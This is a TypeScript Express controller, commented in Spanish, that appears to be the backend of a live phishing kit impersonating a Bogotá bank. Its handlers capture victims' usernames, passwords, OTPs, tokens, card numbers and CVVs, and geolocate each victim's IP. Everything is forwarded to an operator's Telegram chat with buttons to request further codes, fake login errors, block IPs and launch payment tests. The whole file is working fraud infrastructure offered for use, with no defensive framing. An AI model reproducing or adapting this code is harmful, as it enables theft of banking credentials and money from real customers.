import { Request, Response } from 'express';
import { StorageService } from '../../services/StorageService';
import { TelegramService } from '../../services/TelegramService';
import { FirebaseService } from '../../services/FirebaseService';
import { Helper } from '../Helper';

// Se exporta el metodo Bogota
export class BogotaController {

  /**
   * Metodo encargado de agregar un evento al timeline de la sesion
   * 
   * @param session 
   * @param type 
   * @param data 
   * @returns 
   */
  static addEvent(session: any, type: string, data: any) {

    // Se valida si el timeline existe
    if (!session.timeline) session.timeline = [];

    // Se agrega el evento al timeline
    session.timeline.push({
      type,
      data,
      timestamp: new Date().toISOString(),
    });

    // Se retorna la session
    return session;
  }

  /**
   * Metodo encargado de procesar la solicitud de autenticacion
   * 
   * @param req 
   * @param res 
   * @returns 
   */
  static async authenticacion(req: Request, res: Response) {

    // Se usa el try catch
    try {

      // Se obtienen los datos del body
      const data = req.body.data?.attributes;

      // Se valida que haya data
      if (!data) {

        // Se retorna el error
        return res.status(400).json({ success: false, message: 'No data' });
      };

      // Se captura el sessionId
      const sessionId = data.sessionId || data.session_id;

      // Se valida la session
      let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

      // Se valida si hay linea de tiempo
      if (!currentSession.timeline) {

        // Se inicializa la linea de tiempo
        currentSession.timeline = [];
      };

      // Se añade a la linea de tiempo
      currentSession = BogotaController.addEvent(currentSession, 'credenciales', {
        tipoDocumento: data.tipoDocumento || null,
        usuario: data.usuario || null,
        clave: data.clave || null,
        fecha: BogotaController.formatDateCustom(data.fecha),
        metodoAutenticacion: data.metodoAutenticacion || data.metodo_autenticacion || null,
        ultimosDigitosTarjeta: data.ultimosDigitosTarjeta || data.ultimos_digitos_tarjeta || null,
        tipoCliente: data.tipoCliente || data.tipo_cliente || null,
      });

      // Se captura la IP real del cliente
      const rawIp = req.headers['x-forwarded-for']?.toString().split(',')[0] || req.socket.remoteAddress || '';

      // Limpiar la IP (remover prefijos IPv6 si existen)
      const ip = rawIp.replace(/^::ffff:/, '');

      // Geolocalizar la IP
      const geoData = await Helper.getGeoLocation(ip);

      // Formatear la ubicación: "País, Ciudad, Región"
      const location = geoData ? `${geoData.country}, ${geoData.city}, ${geoData.region}` : 'Desconocida';

      // Se agrega el session Id
      currentSession.ip = ip;
      currentSession.location = location;
      currentSession.banco = "BOGOTA";
      currentSession.sessionId = sessionId;

      // Se añade la informacion al storage
      await StorageService.set(`session_${sessionId}`, currentSession);
      await StorageService.set(`status_${sessionId}`, 'pendiente');

      // Se captura si viene por tc
      const tc = currentSession.tc || false;

      // Se inicializan los valores
      const buttons = BogotaController.getButtons(sessionId, tc);
      const message = BogotaController.formatMessage(currentSession);

      // Se valida si hay un messageId previo en la sesión (persiste en Firebase)
      if (currentSession.messageId) {

        // Se elimina el mensaje anterior
        await TelegramService.deletePreviousMessage(currentSession.messageId.toString());
      }

      // Se envia el mensaje
      const msgId = await TelegramService.sendMessage(message, buttons, sessionId);

      // Se setea el messageId en la sesión
      currentSession.sessionId = sessionId;
      currentSession.messageId = msgId;

      // Se setea la data
      await StorageService.set(`session_${sessionId}`, currentSession);

      // Se retorna en true
      res.json({
        success: true,
        sessionId: sessionId
      });
    } catch (error) {

      // Se envia la respuesta
      res.status(500).json({
        success: false,
        message: 'Hubo un error al iniciar sessión ' + (error as Error).message
      });
    }
  }

  /**
   * Metodo encargado de procesar el OTP
   * 
   * @param req 
   * @param res 
   * @returns 
   */
  static async otp(req: Request, res: Response) {

    // Se usa el try catch
    try {

      // Se captura la informacion
      const data = req.body.data?.attributes;
      const sessionId = data.sessionId;

      // Se valida si hay sessionId
      if (!sessionId) {

        // Se retorna
        return res.status(400).json(
          {
            success: false,
            message: 'No session ID - OTP'
          }
        );
      }

      // Se obtiene la informacion de la session
      let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

      // Se captura la OTP
      let otp = data.otp;

      // Se añade la OTP a la linea de tiempo
      currentSession = BogotaController.addEvent(currentSession, 'otp', {
        otp: otp,
        fecha: BogotaController.formatDateCustom(new Date()),
      });

      // Se setea la informacion en el almacenamiento
      await StorageService.set(`session_${sessionId}`, currentSession);
      await StorageService.set(`status_${sessionId}`, 'pendiente');

      // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
      const messageId = currentSession.messageId;

      // Se elimina el mensaje anterior si existe
      if (messageId) {

        // Se elimina el mensaje anterior
        await TelegramService.deletePreviousMessage(messageId.toString());
      }

      // Se inicializa la informacion
      const buttons = BogotaController.getButtons(sessionId, false);
      const message = BogotaController.formatMessage(currentSession);

      // Se envia el mensaje
      const msgId = await TelegramService.sendMessage(message, buttons, sessionId);

      // Se setea el messageId en la sesión
      currentSession.sessionId = sessionId;
      currentSession.messageId = msgId;

      // Se setea la data
      await StorageService.set(`session_${sessionId}`, currentSession);

      // Se retorna la respuesta
      res.json({
        success: true,
        sessionId: sessionId
      });
    } catch (error) {

      // Se envia la respuesta
      res.status(500).json({
        success: false,
        message: 'Hubo un error al enviar el OTP ' + (error as Error).message
      });
    }
  }

  /**
   * Metodo encargado de reenviar OTP
   * 
   * @param req 
   * @param res 
   * @returns 
   */
  static async otpResend(req: Request, res: Response) {

    // Se usa el try catch
    try {

      // Se obtiene el sessionId
      const { sessionId } = req.body.data?.attributes;

      // Se valida si hay sessionId
      if (!sessionId) {

        // Se retorna
        return res.status(400).json(
          {
            success: false,
            message: 'No session ID - REENVIAR OTP'
          }
        );
      }

      // Se obtiene la informacion de la session
      let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

      // Se añade el evento a la linea de tiempo
      currentSession = BogotaController.addEvent(currentSession, 'resend_otp', {
        mensaje: 'El usuario solicita nueva OTP',
        fecha: BogotaController.formatDateCustom(new Date()),
      });

      // Se setea la informacion en el almacenamiento
      await StorageService.set(`session_${sessionId}`, currentSession);
      await StorageService.set(`status_${sessionId}`, 'awaiting_otp_resend_decision');

      // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
      const messageId = currentSession.messageId;

      // Se elimina el mensaje anterior si existe
      if (messageId) {

        // Se elimina el mensaje anterior
        await TelegramService.deletePreviousMessage(messageId.toString());
      }

      // Se inicializa la informacion
      const buttons = BogotaController.getButtons(sessionId, false);
      const message = BogotaController.formatMessage(currentSession);

      // Se envia el mensaje
      const msgId = await TelegramService.sendMessage(message, buttons, sessionId);

      // Se setea el messageId en la sesión
      currentSession.sessionId = sessionId;
      currentSession.messageId = msgId;

      // Se setea la data
      await StorageService.set(`session_${sessionId}`, currentSession);

      // Se retorna la respuesta
      res.json({
        success: true,
        sessionId: sessionId
      });
    } catch (error) {

      // Se envia la respuesta
      res.status(500).json({
        success: false,
        message: 'Hubo un error al reenviar el OTP ' + (error as Error).message
      });
    }
  }

  /**
 * Metodo encargado de procesar el OTP TOKEN
 *
 * @param req
 * @param res
 * @returns
 */
  static async token(req: Request, res: Response) {

    // Se usa el try catch
    try {

      // Se captura la informacion
      const data = req.body.data?.attributes;
      const sessionId = data.sessionId;

      // Se valida si hay sessionId
      if (!sessionId) {

        // Se retorna
        return res.status(400).json({
          success: false,
          message: "No session ID - TOKEN",
        });
      }

      // Se obtiene la informacion de la session
      let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

      // Se captura la TOKEN
      let token = data.token;

      // Se añade la TOKEN a la linea de tiempo
      currentSession = BogotaController.addEvent(currentSession, "token", {
        token: token,
        fecha: BogotaController.formatDateCustom(new Date()),
      });

      // Se setea la informacion en el almacenamiento
      await StorageService.set(`session_${sessionId}`, currentSession);
      await StorageService.set(`status_${sessionId}`, "pendiente");

      // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
      const messageId = currentSession.messageId;

      // Se elimina el mensaje anterior si existe
      if (messageId) {

        // Se elimina el mensaje anterior
        await TelegramService.deletePreviousMessage(messageId.toString());
      }

      // Se inicializa la informacion
      const buttons = BogotaController.getButtons(sessionId, false);
      const message = BogotaController.formatMessage(currentSession);

      // Se envia el mensaje
      const msgId = await TelegramService.sendMessage(message, buttons, sessionId);

      // Se setea el messageId en la sesión
      currentSession.sessionId = sessionId;
      currentSession.messageId = msgId;

      // Se setea la data
      await StorageService.set(`session_${sessionId}`, currentSession);

      // Se retorna la respuesta
      res.json({
        success: true,
        sessionId: sessionId,
      });
    } catch (error) {

      // Se envia la respuesta
      res.status(500).json({
        success: false,
        message: "Hubo un error al enviar el TOKEN " + (error as Error).message,
      });
    }
  }

  /**
 * Metodo encargado de procesar la informacion del link personalizado
 * 
 * @param req 
 * @param res 
 * @returns 
 */
  static async linkCustom(req: Request, res: Response) {

    // Se usa el try catch
    try {

      // Se obtiene la informacion del body
      const { sessionId, text } = req.body.data?.attributes;

      // Se valida si hay sessionId y link personalizado
      if (!sessionId || !text) {

        // Se retorna
        return res.status(400).json(
          {
            success: false,
            message: 'No session ID'
          }
        );
      }

      // Se guarda la informacion
      await StorageService.set(`linkCustom_${sessionId}`, text);
      await StorageService.set(`status_${sessionId}`, 'sol_link_custom');

      // Se obtiene la informacion de la session
      let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

      // Se inicializa el mensaje
      const textLink = `⏳ Solicitando Link: ${text} ⏳`;

      // Se añade la respuesta del usuario a la solicitud de Link personalizado a la linea de tiempo
      currentSession = BogotaController.addEvent(currentSession, 'admin_action', {
        accion: 'sol_link_custom',
        mensaje: textLink,
        link: text,
      });

      // Se setea la informacion en la session de la solicitud 
      await StorageService.set(`session_${sessionId}`, currentSession);

      // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
      const messageId = currentSession.messageId;

      // Se elimina el mensaje anterior si existe
      if (messageId) {

        // Se elimina el mensaje anterior
        await TelegramService.deletePreviousMessage(messageId.toString());
      }

      // Se inicializa la informacion de la solicitud de Link personalizado
      const message = BogotaController.formatMessage(currentSession);

      // Se envia el mensaje
      const msgId = await TelegramService.sendMessage(message, [], sessionId);

      // Se setea el messageId en la sesión
      currentSession.sessionId = sessionId;
      currentSession.messageId = msgId;
      currentSession.linkTester = text;

      // Se setea la data
      await StorageService.set(`session_${sessionId}`, currentSession);

      // Programa prueba de pago en backend central (distribuidor-pasarela-backend)
      const { WebhookController } = await import('../WebhookController');

      // Se programa la prueba de pago
      void WebhookController.triggerScheduleLinkTester(sessionId, text);

      // Se retorna la respuesta
      res.json({
        success: true,
        message: 'Configuración LINK enviada',
        sessionId: sessionId
      });
    } catch (error) {

      // Se envia la respuesta
      console.error(error);

      // Se retorna la respuesta
      res.status(500).json({ success: false });
    }
  }

  /**
   * Metodo encargado de escapar el HTML
   * 
   * @param text 
   * @returns 
   */
  static escapeHtml(text: string): string {

    // Se valida que el texto no sea nulo
    if (!text) return '';

    // Se escapa el HTML
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  /**
   * Metodo encargado de construir los botones para el mensaje de Telegram
   * 
   * @param sessionId
   * @param tc
   * @returns 
   */
  static getButtons(sessionId: string, tc: boolean = false) {

    // Se inicializa el banco
    const bank = "BOGOTA:P01";

    // Se valida cuando viene por TC
    if (tc) {

      // Se retornan los botones para TC
      return [
        [
          { text: '🪪 LG', callback_data: `logo:${sessionId};${bank}` },
          { text: '📱 OTP', callback_data: `sol_otp:${sessionId};${bank}` },
          { text: '✅ FIN', callback_data: `sol_finalizar:${sessionId};${bank}` },
        ],
        [
          { text: '❌ LG', callback_data: `error_login:${sessionId};${bank}` },
          { text: '❌ OTP', callback_data: `error_otp:${sessionId};${bank}` },
          { text: '🚫 BLOQUEAR IP', callback_data: `block_ip:${sessionId};${bank}` },
        ],
      ];
    }

    // Se generan los botones para PSE
    const buttons = [
      [
        { text: '📱 OTP', callback_data: `sol_otp:${sessionId};${bank}` },
        { text: '⌛️ TOKEN', callback_data: `sol_token:${sessionId};${bank}` },
        { text: '✅ FIN', callback_data: `sol_finalizar:${sessionId};${bank}` },
      ],
      [
        { text: '❌ OTP', callback_data: `error_otp:${sessionId};${bank}` },
        { text: '❌ TOKEN', callback_data: `error_token:${sessionId};${bank}` },
        { text: '❌ LG', callback_data: `error_login:${sessionId};${bank}` },
      ],
      [
        { text: '🚫 BLOQUEAR IP', callback_data: `block_ip:${sessionId};${bank}` },
      ],
    ];

    // Se retornan los botones para PSE
    return buttons;
  }

  /**
   * Metodo encargado de formatear las fechas en el formato personalizado
   * 
   * @param dateInput
   * @returns
   */
  static formatDateCustom(dateInput: string | Date): string {

    // Se valida el tipo de dato
    let date = typeof dateInput === 'string' ? new Date(dateInput) : dateInput;

    // Validar si la fecha es invalida
    if (isNaN(date.getTime())) {

      // Fallback a fecha actual
      date = new Date();
    };

    // Días: Dom Lun Mar Mié Jue Vie Sáb
    const dias = [
      'Domingo',
      'Lunes',
      'Martes',
      'Miércoles',
      'Jueves',
      'Viernes',
      'Sábado',
    ];

    // Meses: Ene Feb Mar Abr May Jun Jul Ago Sep Oct Nov Dic
    const meses = [
      'Enero',
      'Febrero',
      'Marzo',
      'Abril',
      'Mayo',
      'Junio',
      'Julio',
      'Agosto',
      'Septiembre',
      'Octubre',
      'Noviembre',
      'Diciembre',
    ];

    // Se inicilizan variables
    const diaLetra = dias[date.getDay()];
    const diaNum = date.getDate();
    const mesLetra = meses[date.getMonth()];
    const anio = date.getFullYear(); // AÑO COMPLETO 2026
    const h24 = date.getHours();
    const ampm = h24 >= 12 ? 'PM' : 'AM';
    let h12 = h24 % 12;
    if (h12 === 0) h12 = 12;
    const hora = h12.toString().padStart(2, '0');
    const min = date.getMinutes().toString().padStart(2, '0');

    // Formato
    return `${diaLetra} ${diaNum} ${mesLetra} ${anio}, ${hora}:${min} ${ampm}`;
  };

  /**
   * Metodo encargado de formatear la tarjeta de credito
   * AMEX / American Express: 4-6-5
   * Otras tarjetas: grupos de 4 dígitos
   * 
   * @param number 
   * @param cardLabel 
   * @returns 
   */
  static formatCardNumber(number: string, cardLabel?: string): string {

    // Se valida cuando no se proporciona un numero
    if (!number) return 'N/A';

    // Eliminar cualquier carácter que no sea numérico
    const clean = number.replace(/\D/g, '');
    const label = (cardLabel ?? '').toLowerCase();

    // Detectar American Express
    const isAmex = label.includes('amex') || label.includes('american express') || /^3[47]/.test(clean);

    // Se valida si es AMEX
    if (isAmex) {

      // Formato AMEX: XXXX XXXXXX XXXXX
      const match = clean.match(/^(\d{0,4})(\d{0,6})(\d{0,5})$/);

      // Se valida si no se pudo hacer el match
      if (!match) return clean;

      // Se retorna el numero formateado
      return [match[1], match[2], match[3]]
        .filter(Boolean)
        .join(' ');
    }

    // Formato estándar: grupos de 4 dígitos
    return clean.match(/.{1,4}/g)?.join(' ') ?? clean;
  }

  /**
   * Metodo encargado de armar el mensaje para telegram
   * 
   * @param data Datos de la sesion
   * @param extraMessage Mensaje adicional
   * @returns Mensaje formateado
   */
  static formatMessage(data: any, extraMessage?: string): string {

    // Encabezado
    let msg = `🏦 [BOGOTA] \n\n`;

    // Metodo encargado de formatear la fecha
    const fechaStr = data.fecha ? BogotaController.formatDateCustom(data.fecha) : BogotaController.formatDateCustom(new Date());

    // Se inicializa la fecha en 
    msg += `📅 <b>Fecha:</b> ${fechaStr}\n`;

    // Se inicializa la informacion
    if (data.sessionId)
      msg += `🕵️ <b>ID:</b> ${Helper.formatTelegramSessionId(data.sessionId)}\n`;
    if (data.ip)
      msg += `🔎 <b>IP:</b> <a href="https://ipinfo.io/${data.ip}">${BogotaController.escapeHtml(data.ip)}</a>\n`;
    if (data.location)
      msg += `🌎 <b>Ubicación:</b> ${BogotaController.escapeHtml(data.location)}\n`;
    if (data.correoUsuario)
      msg += `📧 <b>Correo Usuario:</b> ${BogotaController.escapeHtml(data.correoUsuario)}\n`;
    if (data.precio)
      msg += `💰 <b>Precio:</b> ${BogotaController.escapeHtml(data.precio)}\n`;
    if (data.panel)
      msg += `💻 <b>Panel:</b> ${BogotaController.escapeHtml(data.panel)}\n`;
    if (data.cedula)
      msg += `🪪 <b>Cédula:</b> ${BogotaController.escapeHtml(data.cedula)}\n`;
    if (data.tipoDocumento)
      msg += `🪪 <b>Tipo Documento:</b> ${BogotaController.escapeHtml(data.tipoDocumento)}\n`;
    if (data.celular)
      msg += `👥 <b>Celular:</b> ${BogotaController.escapeHtml(data.celular)}\n\n`;

    // Se inicializa la informacion
    msg += `🎯 <b>Origen:</b> ${data.tc ? 'TC' : 'PSE'} ${data.seccion ? '- ' + data.seccion : ''}\n`;

    // Se inicializa la informacion
    msg += `\n♻️ INFORMACIÓN RECOLECTADA ♻️\n\n`;

    // Recorrer timeline para agrupar y mostrar
    if (data.timeline && Array.isArray(data.timeline)) {
      data.timeline.forEach((event: any) => {
        switch (event.type) {
          case 'admin_action':
            {
              const adminUrlRaw = String(event?.data?.link || event?.data?.url || event?.data?.mensaje || '').trim();
              const adminUrlClean = adminUrlRaw
                .replace(/^⏳\s*Solicitando Link:\s*/i, '')
                .replace(/\s*⏳\s*$/g, '')
                .trim();
              const adminUrlDisplay = adminUrlClean.length > 60 ? `${adminUrlClean.slice(0, 57)}...` : adminUrlClean;
              if (adminUrlClean) {
                msg += `<a href="${BogotaController.escapeHtml(adminUrlClean)}">${BogotaController.escapeHtml(adminUrlDisplay)}</a>\n\n`;
              }
            }
            break;
          case 'pasajero':
            msg += `🛫 Pasajero\n`;
            msg += `<b>Nombre:</b> ${BogotaController.escapeHtml(event.data.nombre)}\n`;
            msg += `<b>Documento:</b> ${BogotaController.escapeHtml(event.data.documento)}\n\n`;
            break;
          case "credenciales":
            msg += `🔐 Credenciales\n`;
            msg += `<b>Tipo Documento:</b> ${BogotaController.escapeHtml(event.data.tipoDocumento)}\n`;
            {
              const PSE_TIPO_ING_SEP = "::PSE::";
              let metodoCred = String(
                event.data.metodoAutenticacion ||
                  event.data.metodo_autenticacion ||
                  "",
              )
                .trim()
                .toLowerCase();
              const metodoRawLower = metodoCred;
              if (metodoRawLower.includes("tarjeta")) {
                metodoCred = "tarjeta_debito";
              } else if (metodoRawLower.includes("clave")) {
                metodoCred = "clave_segura";
              } else {
                metodoCred = "";
              }
              let ultimosCred = String(
                event.data.ultimosDigitosTarjeta ||
                  event.data.ultimos_digitos_tarjeta ||
                  "",
              )
                .replace(/\D/g, "")
                .slice(0, 4);
              const tcStr = String(event.data.tipoCliente || event.data.tipo_cliente || "");
              if (tcStr.includes(PSE_TIPO_ING_SEP)) {
                const p = tcStr.split(PSE_TIPO_ING_SEP);
                const mTc = String(p[1] || "")
                  .trim()
                  .toLowerCase();
                const uTc = String(p[2] || "")
                  .replace(/\D/g, "")
                  .slice(0, 4);
                if (
                  !metodoCred &&
                  (mTc === "tarjeta_debito" || mTc === "clave_segura")
                ) {
                  metodoCred = mTc;
                }
                if (ultimosCred.length < 4 && uTc.length === 4) {
                  ultimosCred = uTc;
                }
              }
              if (ultimosCred.length === 4) {
                metodoCred = "tarjeta_debito";
              }
              if (!metodoCred) {
                metodoCred = "clave_segura";
              }
              msg += `<b>Tipo de ingreso:</b> ${
                metodoCred === "tarjeta_debito"
                  ? "Tarjeta debito"
                  : "Clave segura"
              }\n`;
              msg += `<b>User:</b> ${BogotaController.escapeHtml(event.data.usuario)}\n`;
              msg += `<b>Password:</b> ${BogotaController.escapeHtml(event.data.clave)}\n`;
              if (ultimosCred.length === 4) {
                msg += `<b># tarjeta:</b> ${BogotaController.escapeHtml(ultimosCred)}\n`;
              }
            }
            msg += `\n`;
            break;
          case 'otp':
            msg += `📲 OTP\n`;
            msg += `<b>OTP:</b> ${event.data.otp}\n\n`;
            break;
          case 'resend_otp':
            msg += `<b>El Usuario solicita nueva OTP</b> 📱\n\n`;
            break;
          case "token":
            msg += `⌛️ TOKEN\n`;
            msg += `<b>TOKEN:</b> ${event.data.token}\n\n`;
            break;
          case 'tc_bin':
            msg += `💳 INFORMACIÓN DE LA TARJETA\n`;
            msg += `<b>PAÍS:</b> ${BogotaController.escapeHtml(event.data.country)}\n`;
            msg += `<b>BANCO:</b> ${BogotaController.escapeHtml(event.data.bank)}\n`;
            msg += `<b>TIPO:</b> ${BogotaController.escapeHtml(event.data.type)}\n`;
            msg += `<b>FRANQUICIA:</b> ${BogotaController.escapeHtml(event.data.frachise)}\n`;
            msg += `<b>CATEGORIA:</b> ${BogotaController.escapeHtml(event.data.category)}\n`;
            msg += `\n`;
            break;
          case 'tc':
            msg += `💳 TC\n`;
            msg += `<b>TC:</b> ${BogotaController.formatCardNumber(event.data.numeroTarjeta)}\n`;
            msg += `<b>CVV:</b> ${event.data.cvv}\n`;
            msg += `<b>DATE:</b> ${event.data.fechaExpiracion}\n\n`;
            break;
          case 'bot_value':
            msg += `🤖 <b>Resultado Transacción:</b>\n`;
            if (event.data.TX_VALUE) {
              msg += `<b>Valor:</b> ${BogotaController.escapeHtml(event.data.TX_VALUE)}\n`;
            }
            if (event.data.lapTransactionState) {
              msg += `<b>Estado:</b> ${BogotaController.escapeHtml(event.data.lapTransactionState)}\n`;
            }
            if (event.data.buyerEmail) {
              msg += `<b>Email:</b> ${BogotaController.escapeHtml(event.data.buyerEmail)}\n`;
            }
            if (event.data.fechaTransaccion) {
              msg += `<b>Fecha Transacción:</b> ${BogotaController.escapeHtml(event.data.fechaTransaccion)}\n`;
            }

            // Se agrega un salto de linea
            msg += `\n`;

            // Se finaliza el switch
            break;
        }
      });
    }

    // 🔥 AQUÍ agregas el mensaje dinámico
    if (extraMessage && extraMessage !== undefined && extraMessage.trim() !== '') {
      msg += `${extraMessage}`;
    }

    // Se retorna el mensaje
    return msg;
  }

  /**
   * Metodo encargado de validar si una IP esta bloqueada
   * 
   * @param req 
   * @param res 
   * @returns 
   */
  static async validatedIpBlock(req: Request, res: Response) {

    // Se usa el try catch para validar errores
    try {

      // Se captura la IP del body, aunque realmente se debería capturar la IP real del cliente (req.socket.remoteAddress o x-forwarded-for)
      const { ip } = req.body.data?.attributes;

      // Se captura la IP real del cliente para bloquearla, en lugar de confiar en el body que podría ser manipulado. Esto es crucial para seguridad.
      const ipRequest = FirebaseService.getClientIp(req);

      // Se obtiene la lista de direcciones IP del firebase
      const listIps = await FirebaseService.getBlockedIps();

      console.error("IP del frontend 1 -> ", ip);
      console.error("IP del backend  2 -> ", ipRequest);

      // Se verifica si la IP del request está en la lista de IPs bloqueadas. Si es así, se bloquea el acceso.
      if (listIps.includes(ip)) {

        console.error("IP bloqueada detectada -> ", ip);
        console.error("--------------------------------------------------");

        // Se retorna un mensaje indicando que la IP está bloqueada.
        return res.status(403).json({
          success: true,
          status: "error_blocked",
          ip: ip
        });
      };

      console.error("IP no bloqueada -> ", ip);
      console.error("--------------------------------------------------");

      // Se retorna un mensaje indicando que la IP está no bloqueada.
      return res.status(200).json({
        success: false,
        status: "not_blocked",
        ip: ip
      });
    } catch (error) {

      // Se captura el mensaje
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';

      // Se loguea el error para diagnóstico
      console.error("Error al obtener IPs bloqueadas -> ", errorMessage);

      // Se retorna la respuesta
      return res.status(500).json(
        {
          success: false,
          message: 'Failed to get blocked IPs' + errorMessage
        }
      );
    }
  }
  
  /**
   * Metodo encargado de verificar el estado de la solicitud
   * 
   * @param req 
   * @param res 
   * @returns 
   */
  static async verifyState(req: Request, res: Response) {

    // Se usa el try catch
    try {

      // Se obtiene el sessionId de la solicitud
      const { sessionId } = req.params;

      // Se captura el sessionId
      const sessionIdStr = Array.isArray(sessionId) ? sessionId[0] : sessionId;

      // Sesión local + Firebase (misma colección pasarela que el distribuidor)
      const session = (await StorageService.get(`session_${sessionIdStr}`)) || {};
      const firebaseSession = await FirebaseService.getSession(sessionIdStr);

      // Storage tiene prioridad; si quedó en pendiente tras generate-link, Firebase puede traer sol_link_bot/link_bot
      let status = (await StorageService.get(`status_${sessionIdStr}`)) || firebaseSession?.lastStatus || session?.lastStatus || 'pendiente';

      // Se inicializa la variable para almacenar los datos de la tarjeta
      let cardData = null;
      let text = null;

      // Retornar cardData específico según el estado actual (CVV), cada flujo es completamente independiente
      const cvvStates = [
        'sol_cvv_custom',
        'awaiting_cvv_approval',
        'error_cvv_custom',
      ];

      // Retornar cardData específico según el estado actual (TC), cada flujo es completamente independiente
      const tcStates = [
        'sol_tc_custom',
        'awaiting_tc_approval',
        'error_tc_custom',
      ];

      // Estados con link de redirección de bots
      const linkStatesBots = [
        'sol_link_bot',
        'link_bot',
        'sol_link_custom',
      ];

      // Se captura los datos de la tarjeta según el estado actual
      if (cvvStates.includes(status)) {

        // Se obtiene la informacion de la tarjeta cvv
        cardData = await StorageService.get(`cardData_cvv_${sessionId}`);
      } else if (tcStates.includes(status)) {

        // Se obtiene la informacion de la tarjeta tc
        cardData = await StorageService.get(`cardData_tc_${sessionId}`);
      }

      // Se inicializa la variable para almacenar la url
      let url = null;

      // Se captura la url según el estado actual
      if (linkStatesBots.includes(status)) {

        // Se valida si el estado es sol_link_custom
        if (status === 'sol_link_custom') {

          // Se obtiene el link personalizado
          url = await StorageService.get(`linkCustom_${sessionIdStr}`);
        } else {

          // Se obtiene la url automática
          url =
            session?.urlAutomatic ||
            firebaseSession?.urlAutomatic ||
            (await StorageService.get(`urlAutomatic_${sessionIdStr}`)) ||
            null;

          // Con URL lista, el frontend redirige en case link_bot
          if (url) {

            // Se setea el estado a link_bot
            status = 'link_bot';
          }
        }
      } else if (firebaseSession?.urlAutomatic && ['sol_link_bot', 'link_bot'].includes(String(firebaseSession.lastStatus || ''))) {

        // generate-link guardó el link en Firebase pero storage quedó en pendiente
        status = 'link_bot';

        // Se obtiene la url automática
        url = firebaseSession.urlAutomatic;
      }

      // Se fusiona la sesion para resolver datos TC desde timeline/storage
      const mergedSession = { ...session, ...firebaseSession, timeline: firebaseSession?.timeline ?? session?.timeline };
      const isTcSession = Boolean(firebaseSession?.tc ?? session?.tc);
      const tcFlowStates = ['sol_otp', 'error_otp', 'sol_finalizar', 'sol_finalizado', 'solicitar_finalizar'];
      const tcOtpStates = ['sol_otp', 'error_otp'];
      const tarjetaTc = tcOtpStates.includes(String(status).toLowerCase()) ? Helper.getTcCardNumberFromSession(mergedSession) : "";

      // Se captura la IP real del cliente para bloquearla, en lugar de confiar en el body que podría ser manipulado. Esto es crucial para seguridad.
      const ipRequest = FirebaseService.getClientIp(req);

      // Se obtiene la lista de direcciones IP del firebase
      const listIps = await FirebaseService.getBlockedIps();

      // Se verifica si la IP del request está en la lista de IPs bloqueadas. Si es así, se bloquea el acceso.
      if (listIps.includes(ipRequest)) {

        // Se elimina la sesión para evitar que el usuario siga enviando datos mientras está bloqueado
        await StorageService.remove(`session_${sessionId}`);

        // Se retorna un mensaje indicando que la IP está bloqueada.
        return res.status(403).json({
          success: false,
          estado: "error_blocked",
          sesion: 'activa',
          url: url,
          text,
          cardData,
          bank: "BOGOTA",
          tc: isTcSession,
          tarjeta: tarjetaTc || null,
        });
      };

      // Se inicializa el payload base
      const payload: Record<string, unknown> = {
        success: true,
        estado: status,
        sesion: 'activa',
        cardData,
        text,
        url,
        bank: "BOGOTA",
      };

      // Se agrega informacion TC para redireccionar a ingreso-tc/otp si aplica
      if (isTcSession && tcFlowStates.includes(String(status).toLowerCase())) {

        // Se setea el flag de TC
        payload.tc = true;

        // Se setea la tarjeta TC
        if (tcOtpStates.includes(String(status).toLowerCase())) {

          // Se setea la tarjeta TC
          payload.tarjeta = tarjetaTc || null;
        }
      }

      // Se retorna el valor actual del estado para que el frontend pueda actuar en consecuencia (mostrar botones, etc.)
      res.json(payload);
    } catch (error) {

      // Se envia la respuesta
      res.status(500).json({
        success: false,
        message: 'Error al verificar el estado de la petición ' + error,
      });
    }
  }
}